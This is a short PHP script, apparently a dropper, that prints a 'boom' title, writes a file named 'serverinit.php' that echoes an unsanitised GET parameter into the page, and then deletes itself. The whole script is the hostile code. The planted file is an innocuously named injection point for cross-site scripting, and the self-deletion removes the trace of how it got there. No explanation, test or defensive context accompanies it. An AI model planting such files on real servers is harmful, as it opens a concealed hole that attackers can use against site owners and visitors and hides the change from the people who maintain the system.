<?php
echo '<title>💣 boom 💥</title>';
file_put_contents('serverinit.php', '<?=($_GET[_]) ?>');
unlink(__FILE__);
?>
